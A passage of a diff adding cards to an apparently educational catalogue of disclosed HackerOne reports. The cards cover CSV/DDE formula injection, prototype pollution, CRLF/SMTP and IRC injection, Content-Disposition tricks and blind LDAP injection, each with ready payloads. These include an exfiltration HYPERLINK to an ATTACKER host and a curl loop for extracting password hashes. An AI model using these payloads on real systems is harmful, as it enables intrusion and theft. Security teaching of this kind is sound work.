+&lt;a href='...Ubiquiti_update.cmd?...&amp;callback=\%22||calc||' download='ubiquiti_update.cmd'&gt;Download&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> RFD needs three things: reflected input, a way to force a filename/extension (path segment or Content-Disposition), and permissive Content-Type. Restrict callbacks to alphanumerics to kill it.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/107960" target="_blank" rel="noopener">hackerone.com/reports/107960</a></span><a class="src" href="#report-107960" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1215263" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="125">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Content-Disposition quote injection -&gt; arbitrary download extension</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1215263</b> · nextcloud · USD 125 · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Unescaped quotes in the filename of the Content-Disposition header let an attacker close the quoted filename and append a different extension, so a file shown as .png saves to disk as .bat.</p>
+<h4>Method</h4><ol><li>Send/upload a file named test.bat".png (embedded quote)</li><li>Victim views it as a benign .png and clicks download</li><li>Browser honors the injected filename and writes test.bat</li></ol>
+<div class="pre">Content-Disposition: attachment; filename="test.bat".png"</div>
+<p class="insight"><b>Insight —</b> Any endpoint that reflects a user-controlled filename into Content-Disposition without escaping quotes lets you control the saved extension; try name".ext to break out. Bypasses email/extension filters and abuses user trust.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1215263" target="_blank" rel="noopener">hackerone.com/reports/1215263</a></span><a class="src" href="#report-1215263" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-111192" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV-injection sanitizer bypass via a leading newline before the formula</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#111192</b> · security · awarded · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A fix that only strips/escapes the first character when it is =,+,-,@ is bypassed by prefixing the payload with a newline (0x0A): the first char is now whitespace, so the check passes, but the spreadsheet still parses the following line as a formula.</p>
+<h4>Method</h4><ol><li>If leading-character sanitization is present, prepend %0A (newline) before the formula</li><li>Submit the value into an exportable field</li><li>Export and open -&gt; the post-newline cell is still evaluated</li></ol>
+<div class="pre">report[title]=%0A-2+3+cmd|' /C calc'!D2</div>
+<p class="insight"><b>Insight —</b> When retesting a CSV-injection fix, try leading control chars (newline 0x0A, carriage return 0x0D, tab, space) and quotes before the formula trigger. First-character-only sanitizers are the common, bypassable pattern.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/111192" target="_blank" rel="noopener">hackerone.com/reports/111192</a></span><a class="src" href="#report-111192" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-137631" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SMTP command injection via unvalidated MAIL FROM / RCPT TO (Net::SMTP)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#137631</b> · ruby · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>ruby</b></span><span>Surface <b>other</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Net::SMTP forwards caller-supplied envelope addresses into the SMTP dialogue without validating/escaping CRLF, so an address containing \r\n plus SMTP verbs injects additional protocol commands (extra recipients, arbitrary DATA).</p>
+<h4>Method</h4><ol><li>Find where an app builds MAIL FROM/RCPT TO from user input (email field)</li><li>Embed CRLF + SMTP commands in the address value</li><li>Injected commands execute against the SMTP server (add recipients, spoof messages)</li></ol>
+<div class="pre">RCPT TO:&lt;victim@example.com&gt;\r\nRCPT TO:&lt;attacker@evil.com&gt;\r\nDATA\r\n...</div>
+<p class="insight"><b>Insight —</b> Protocol-level injection mirrors CRLF/HTTP splitting: any library that passes user data into a line-based protocol (SMTP, IMAP, LDAP, Redis, FTP) without CRLF validation is injectable. Validate addresses against RFC and strip CR/LF at the protocol layer.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/137631" target="_blank" rel="noopener">hackerone.com/reports/137631</a></span><a class="src" href="#report-137631" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-175403" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTML/link injection into outgoing emails via unsanitized signup fields</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#175403</b> · brave · awarded · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>web</b></span><span>Tag <b>spoofing-phishing</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Newsletter/signup form fields are reflected unsanitized into the HTML body of a system-sent email, letting an attacker inject arbitrary links/markup that arrive from the trusted sender domain (phishing).</p>
+<h4>Method</h4><ol><li>Enter HTML/anchor markup into signup form fields</li><li>Trigger the confirmation/notification email</li><li>Received email renders the injected link/markup from the trusted brand</li></ol>
+<div class="pre">&lt;a href='http://evil.com'&gt;YOU JUST WON 1m$&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> Any user input echoed into templated emails is an HTML-injection/phishing sink with high deliverability (sent by the trusted domain). Test signup/contact/notification fields with HTML and check the resulting email body.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/175403" target="_blank" rel="noopener">hackerone.com/reports/175403</a></span><a class="src" href="#report-175403" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-380878" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via constructor.prototype (bypasses __proto__ filters)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#380878</b> · nodejs-ecosystem · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Chain <b>prototype pollution -&gt; Object.prototype flags -&gt; possi</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A recursive merge/defaults function (defaults-deep) walks attacker-controlled keys without blocking prototype keys; sending {constructor:{prototype:{...}}} reaches Object.prototype and injects properties onto every object (CVE-2018-16486).</p>
+<h4>Method</h4><ol><li>Find a recursive merge/extend/defaults/set on attacker-controlled JSON</li><li>Send a payload nesting constructor.prototype (works even if __proto__ is filtered)</li><li>Read back a global property to confirm Object.prototype was polluted</li></ol>
+<div class="pre">var defaultsDeep = require('defaults-deep');
+var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
+defaultsDeep({}, payload);
+console.log(({}).isAdmin); // true</div>
+<p class="insight"><b>Insight —</b> When testing prototype pollution, always try the constructor.prototype path in addition to __proto__ - naive guards blocklist only the literal __proto__ key. Polluted globals then flip auth flags, inject template gadgets, or DoS depending on the app.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/380878" target="_blank" rel="noopener">hackerone.com/reports/380878</a></span><a class="src" href="#report-380878" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-928280" style="--sv:var(--sev-med)" data-sev="2" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV / spreadsheet formula injection in export feature</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#928280</b> · nextcloud · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>stored user input -&gt; unsanitized CSV export -&gt; spreads</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Free-text answers are written into an exported CSV without neutralizing leading formula triggers (= + - @); when a victim opens the export in Excel/Calc the cell is evaluated, enabling data exfiltration, local file read, or command execution (with the app's trust prompt).</p>
+<h4>Method</h4><ol><li>Submit a form answer beginning with a formula trigger character</li><li>Get an admin/other user to export answers to CSV and open in a spreadsheet</li><li>Formula executes in their spreadsheet context</li></ol>
+<div class="pre">=1+1
+=cmd|'/C calc'!A0
+=HYPERLINK("http://ATTACKER/?d="&amp;A1,"click")   ; exfil neighbouring cell
+; mitigation: prefix cell value with a single quote</div>
+<p class="insight"><b>Insight —</b> Any user text reaching a CSV/XLS export is a formula-injection sink; probe with leading =,+,-,@ and DDE/HYPERLINK payloads. Impact is client-side but can exfiltrate other users' rows.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/928280" target="_blank" rel="noopener">hackerone.com/reports/928280</a></span><a class="src" href="#report-928280" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-223999" style="--sv:var(--sev-med)" data-sev="2" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV/DDE formula injection with export-filter bypass</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#223999</b> · weblate · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>weblate</b></span><span>Surface <b>web</b></span><span>Chain <b>stored payload in user field -&gt; admin CSV export -&gt; DD</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-supplied field values are written into an exported CSV without neutralizing spreadsheet formula prefixes; when the victim opens the file in Excel/Sheets, cells starting with =,+,-,@ (or DDE payloads) execute. Naive filters that only prefix a quote to those four characters are bypassable.</p>
+<h4>Method</h4><ol><li>Store a formula/DDE payload in any field that appears in a CSV/XLSX export (name, translation, store name, ticket field)</li><li>Trigger the export as the victim (often an admin)</li><li>Payload executes on open; DDE can spawn local commands</li></ol>
+<div class="pre"># DDE command execution in a spreadsheet cell:
+=cmd|' /C calc'!A0
+# Filter bypasses observed:
+%0A-3+3+cmd|' /C calc'!D2      # leading newline defeats a first-char check
+;=cmd|' /C calc'!A0            # leading ';' acts as a new-cell separator, defeats leading-quote escaping</div>
+<p class="insight"><b>Insight —</b> Any export-to-CSV/XLSX feature that echoes stored user data is a formula-injection sink, often second-order (payload stored in a profile/store-name field, fires when an admin exports). A correct fix must prefix a quote/tab AND account for the newline and separator (;) bypasses and for the pipe (|) used by DDE — checking only =,+,-,@ is insufficient.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/223999" target="_blank" rel="noopener">hackerone.com/reports/223999</a></span><a class="src" href="#report-223999" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-430291" style="--sv:var(--sev-med)" data-sev="2" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution in Node deep-merge/extend utilities via __proto__ and constructor.prototype</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#430291</b> · nodejs-ecosystem · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Chain <b>prototype pollution -&gt; override Object.prototype.toString</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Recursive merge/extend/clone helpers copy attacker-controlled keys onto the target without excluding __proto__ / constructor / prototype, so a crafted JSON object writes onto Object.prototype, affecting every object process-wide. Overriding toString/valueOf breaks Express and forces 500s on all subsequent requests (guaranteed DoS); richer gadgets reach RCE.</p>
+<h4>Method</h4><ol><li>Find an endpoint that JSON.parses user input and passes it into a deep merge/extend/clone (config merge, body handling)</li><li>Send a payload with __proto__ or constructor.prototype nesting</li><li>Object.prototype is polluted; set toString/valueOf to a string to crash Express, or plant gadget props for code-flow hijack</li></ol>
+<div class="pre">var extend = require('just-extend');
+// __proto__ form
+extend(true, {}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
+console.log({}.isAdmin); // true
+// constructor.prototype bypass (defeats naive __proto__ key filters)
+extend(true, {}, JSON.parse('{"constructor":{"prototype":{"isAdmin2":true}}}'));
+console.log({}.isAdmin2); // true
+// DoS gadget: {"__proto__":{"toString":"x"}} -&gt; Express 500 on every request</div>
+<p class="insight"><b>Insight —</b> Any recursive merge of untrusted JSON is a prototype-pollution sink. Two payload shapes matter: __proto__ AND constructor.prototype (the latter bypasses filters that only strip __proto__). Minimum impact is a reliable app-wide DoS by clobbering toString/valueOf; escalate to RCE where a gadget (e.g. template/spawn option) reads a polluted property. Probe body-parsing endpoints and config-merge code with both forms.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/430291" target="_blank" rel="noopener">hackerone.com/reports/430291</a></span><a class="src" href="#report-430291" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1278891" style="--sv:var(--sev-med)" data-sev="2" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Blind LDAP injection via OpenAM Webfinger (CVE-2021-29156) -&gt; data extraction</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1278891</b> · deptofdefense · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth Webfinger LDAP injection -&gt; boolean oracle -&gt; c</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">ForgeRock OpenAM before 13.5.1 builds an LDAP query from the unauthenticated Webfinger/OAuth resource parameter without escaping, enabling blind boolean LDAP injection: response differences (200 vs 404) let an unauthenticated attacker extract password hashes/session tokens/keys character-by-character.</p>
+<h4>Method</h4><ol><li>Find an OpenAM (&lt;13.5.1) Webfinger/OAuth endpoint.</li><li>Inject LDAP filter conditions into the resource/username param and observe response-status oracle (200 = condition true).</li><li>Iterate character-by-character to enumerate usernames and exfiltrate secret attribute values.</li></ol>
+<div class="pre"># boolean oracle via Webfinger resource param (see CVE-2021-29156 / nuclei template):
+GET /openam/.well-known/webfinger?resource=acct:*)(userPassword=A*  -&gt; 200 (true)
+GET /openam/.well-known/webfinger?resource=acct:*)(userPassword=Z*  -&gt; 404 (false)</div>
+<p class="insight"><b>Insight —</b> LDAP injection is not only DoS/auth-bypass: with a response-status or content oracle it becomes blind data exfiltration (like blind SQLi). Fingerprint OpenAM version and Webfinger; automate char-by-char extraction of userPassword/session/key attributes.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1278891" target="_blank" rel="noopener">hackerone.com/reports/1278891</a></span><a class="src" href="#report-1278891" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1278050" style="--sv:var(--sev-med)" data-sev="2" data-votes="2" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Boolean-blind LDAP injection via OpenAM Webfinger (CVE-2021-29156)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1278050</b> · deptofdefense · none · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">ForgeRock OpenAM before 13.5.1 passes the unauthenticated Webfinger/OIDC-discovery 'resource' parameter into an LDAP search filter unsanitized, so an attacker can inject LDAP wildcard/filter syntax and infer data character-by-character from the HTTP status code (200 = match, 404 = no match).</p>
+<h4>Method</h4><ol><li>Locate an OpenAM instance and hit the unauthenticated discovery endpoint: /openam/.well-known/webfinger</li><li>Inject an LDAP wildcard into the resource value: resource=http://x/&lt;prefix&gt;*&amp;rel=http://openid.net/specs/connect/1.0/issuer</li><li>Observe the differential response: HTTP 200 OK means a username starts with &lt;prefix&gt;; HTTP 404 Not Found means it does not</li><li>Seed the first two characters (single-char prefixes always 404), then extend char-by-char over {a..z}{0..9} to enumerate valid usernames without any lockout</li><li>Repeat the same oracle against other LDAP attributes (userPassword hash, session token, signing private key) to extract them character-by-character</li><li>For special chars in the fuzzed value, double-URL-encode (e.g. / -&gt; %252F, + -&gt; %252B)</li></ol>
+<div class="pre"># username / attribute enumeration oracle (200 = prefix exists, 404 = no)
+GET /openam/.well-known/webfinger?resource=http://x/TARGETPREFIX*&amp;rel=http://openid.net/specs/connect/1.0/issuer HTTP/1.1
+Host: TARGET
+
+# brute the first two chars, then extend:
+for i in {a..z}{a..z}; do echo -n "$i = " &amp;&amp; curl -s -o /dev/null -w '%{http_code}\n' \
+  "https://TARGET/openam/.well-known/webfinger?resource=http://x/$i*&amp;rel=http://openid.net/specs/connect/1.0/issuer"; done
+
+# special chars must be double-url-encoded, e.g.  /  -&gt; %252F   +  -&gt; %252B</div>
+<p class="insight"><b>Insight —</b> OIDC/OAuth discovery and Webfinger endpoints (.well-known/webfinger, .well-known/openid-configuration) are unauthenticated LDAP-backed lookups on many identity products; wildcard '*' plus an HTTP-status oracle turns them into a blind LDAP-injection exfiltration primitive. Also check for absence of login lockout, which is what makes char-by-char extraction practical. Fingerprint OpenAM/ForgeRock and test /openam/.well-known/webfinger first.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1278050" target="_blank" rel="noopener">hackerone.com/reports/1278050</a></span><a class="src" href="#report-1278050" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-310446" style="--sv:var(--sev-med)" data-sev="2" data-votes="2" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via recursive merge/extend in npm modules (__proto__ in JSON)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#310446</b> · nodejs-ecosystem · none · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>Prototype pollution -&gt; overwrite toString/valueOf -&gt; a</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Deep merge/extend/clone utilities recursively copy attacker-controlled JSON into a target object without guarding the __proto__ key, so a payload like {"__proto__":{"x":"y"}} walks into and mutates Object.prototype, adding/overriding properties on every object process-wide (DoS by clobbering toString/valueOf; RCE with richer gadgets).</p>
+<h4>Method</h4><ol><li>Identify a server endpoint that parses user JSON and feeds it to a deep merge/extend/clone (deap.merge/extend/clone, smart-extend.deep, etc.)</li><li>Send a JSON body containing a __proto__ key: {"__proto__":{"polluted":"yes"}}</li><li>Confirm pollution: an unrelated fresh object ({}).polluted now returns the injected value</li><li>Escalate: overwrite toString/valueOf to break Express (500 on every request = DoS), or craft gadget props toward RCE</li></ol>
+<div class="pre">var deap = require('deap');
+var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
+var a = {};
+console.log('Before: ' + a.oops);   // undefined
+deap.merge({}, JSON.parse(malicious_payload));
+console.log('After: ' + a.oops);    // It works !
+
+// smart-extend variant (deep):
+var extend = require('smart-extend');
+extend.deep({}, JSON.parse('{"__proto__":{"polluted":"deep_done !"}}'));</div>
+<p class="insight"><b>Insight —</b> Any recursive object merge/extend/clone that accepts user JSON is a prototype-pollution sink. Probe with {"__proto__":{"canary":1}} then read ({}).canary. Guaranteed DoS by polluting toString/valueOf (breaks Express -&gt; 500s); escalate to RCE where downstream code uses polluted props as config/template/spawn options. Also test constructor.prototype as an alternate path when __proto__ is filtered.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/310446" target="_blank" rel="noopener">hackerone.com/reports/310446</a></span><a class="src" href="#report-310446" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-439098" style="--sv:var(--sev-med)" data-sev="2" data-votes="2" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via recursive object merge (mergify npm)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#439098</b> · nodejs-ecosystem · none · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A deep/recursive merge function copies attacker-controlled JSON keys without excluding __proto__, so a __proto__ key mutates Object.prototype for the whole runtime.</p>
+<h4>Method</h4><ol><li>Find an npm util or endpoint that deep-merges/clones user JSON (merge, extend, defaultsDeep, clone).</li><li>Send a payload whose top-level key is __proto__ (or constructor.prototype) with a property to inject.</li><li>Confirm pollution by reading the injected property on an unrelated fresh object.</li></ol>
+<div class="pre">var mergify = require('mergify');
+var payload = '{"__proto__":{"polluted":"mergify_done !"}}';
+var test = {};
+mergify({}, JSON.parse(payload));
+console.log(test.polluted); // 'mergify_done !'</div>
+<p class="insight"><b>Insight —</b> Any library that recursively copies user-controlled JSON into an object is a prototype-pollution sink; test every deep-merge/clone/defaults path with a __proto__ key, then look for gadgets (DoS, property-driven auth/logic flips, EJS/Handlebars template-&gt;RCE).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/439098" target="_blank" rel="noopener">hackerone.com/reports/439098</a></span><a class="src" href="#report-439098" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-29480" style="--sv:var(--sev-med)" data-sev="2" data-votes="1" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Line-oriented protocol command injection via unvalidated input (CRLF into IRC)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#29480</b> · irccloud · awarded · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>irccloud</b></span><span>Surface <b>web</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled input (an IRC channel name) is passed into a newline-delimited backend protocol without stripping CR/LF, so embedded %0a%0d sequences are parsed as separate IRC commands (e.g. QUIT), giving the attacker command injection against the victim's IRC session.</p>
+<h4>Method</h4><ol><li>Identify input that is forwarded into a line-based protocol (IRC/SMTP/Redis/memcached/LDAP).</li><li>Inject encoded CR/LF (%0a%0d) plus a protocol command into the value.</li><li>Have the victim's client join/use the crafted name so the injected command executes in their session (here QUIT force-closes the client).</li><li>Escalate to other commands the protocol accepts (e.g. channel handover, mode changes).</li></ol>
+<div class="pre">#treehouse'){%0a%0dQUIT</div>
+<p class="insight"><b>Insight —</b> Whenever web input is relayed verbatim into a newline-delimited backend protocol, test CR/LF injection with %0a%0d followed by a protocol verb. The same primitive underlies SMTP header injection, Redis/memcached command injection, and HTTP response splitting -- the sink protocol changes, the CRLF trick doesn't. Fix is to reject/strip CR/LF in names.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/29480" target="_blank" rel="noopener">hackerone.com/reports/29480</a></span><a class="src" href="#report-29480" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-92353" style="--sv:var(--sev-med)" data-sev="2" data-votes="1" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV/formula injection via exported user fields</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#92353</b> · automattic · awarded · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Chain <b>stored user field -&gt; CSV export -&gt; spreadsheet formula</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled fields are exported to CSV without neutralizing leading formula characters, so a value beginning with =, +, -, @ is evaluated as a spreadsheet formula when a victim opens the export in Excel/Sheets, enabling data exfiltration and command execution (DDE).</p>
+<h4>Method</h4><ol><li>Find any feature that stores user input and later exports it to CSV/XLSX (contacts, members, orders, polls).</li><li>Set a text field to a formula, e.g. =2*10 to confirm evaluation, or a DDE payload for command execution.</li><li>Export and open in Excel; the cell evaluates the formula (or prompts DDE).</li></ol>
+<div class="pre">=2*10                      // proof: cell shows 20
+=cmd|' /C calc'!'A1'        // DDE command execution when opened in Excel</div>
+<p class="insight"><b>Insight —</b> Any input that can end up in a spreadsheet export is a formula-injection sink. Test =,+,-,@ (and tab/CR prefixes). Defenders must prefix such cells with a single quote or strip leading formula chars; note partial filters that only sanitize the first occurrence (see #118103) are bypassable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/92353" target="_blank" rel="noopener">hackerone.com/reports/92353</a></span><a class="src" href="#report-92353" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-310706" style="--sv:var(--sev-med)" data-sev="2" data-votes="1" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via recursive object-merge with __proto__ JSON payload</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#310706</b> · nodejs-ecosystem · none · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>prototype pollution -&gt; Object.prototype.toString/valueOf </b></span></div>
+<h4>Root cause</h4><p style="margin:0">Deep/recursive object-merge utilities copy attacker-controlled keys onto the target without excluding __proto__/constructor, so a JSON body containing a __proto__ key writes onto Object.prototype and affects every object in the process.</p>
+<h4>Method</h4><ol><li>Find a Node endpoint that JSON.parses request data and passes it into a merge/extend/clone utility (merge-object, deap.extend, merge-options, merge-recursive, etc.)</li><li>Send a JSON body whose top-level key is __proto__ with a nested property</li><li>Confirm pollution by reading the injected property off a fresh empty object ({}.oops)</li><li>For DoS, overwrite Object.prototype.toString/valueOf with a string to break Express and force 500s on all subsequent requests; craft heavier gadget payloads for RCE where a sink exists</li></ol>
+<div class="pre">var merge = require('merge-object');
+var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
+var a = {};
+console.log("Before : " + a.oops); // undefined
+merge({}, JSON.parse(malicious_payload));
+console.log("After : " + a.oops);  // It works !</div>
+<p class="insight"><b>Insight —</b> Any server-side deep-merge of untrusted JSON is a prototype-pollution sink. Probe with {"__proto__":{"x":"y"}} and verify on a new object; guaranteed DoS via toString/valueOf clobber, potential RCE when a downstream gadget (template engine, child_process opts) reads polluted props.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/310706" target="_blank" rel="noopener">hackerone.com/reports/310706</a></span><a class="src" href="#report-310706" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-980599" style="--sv:var(--sev-med)" data-sev="2" data-votes="1" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via dot-notation set() path (__proto__.isAdmin)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#980599</b> · nodejs-ecosystem · none · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>prototype pollution -&gt; inject isAdmin/auth flag on Object</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A dot-notation object setter (ts-dot-prop set()) walks/creates nested keys from a string path without blocking __proto__ segments, so a path like '__proto__.isAdmin' writes onto Object.prototype.</p>
+<h4>Method</h4><ol><li>Find a lib/endpoint that maps a string 'a.b.c' path to a nested object write (set/setValue/deepSet)</li><li>Supply path '__proto__.isAdmin' with value true</li><li>Read the property off a fresh object to confirm pollution</li></ol>
+<div class="pre">const tsDot = require('ts-dot-prop');
+var obj = {};
+console.log("Before : " + obj.isAdmin); // undefined
+tsDot.set(obj, '__proto__.isAdmin', true);
+console.log("After : " + obj.isAdmin);  // true</div>
+<p class="insight"><b>Insight —</b> Distinct from JSON-merge pollution: the vector is the STRING PATH, not a nested object. Anywhere user input becomes a dot-path into set()/lodash.set-style helpers, try '__proto__.&lt;x&gt;' and 'constructor.prototype.&lt;x&gt;' to inject flags like isAdmin.</p>
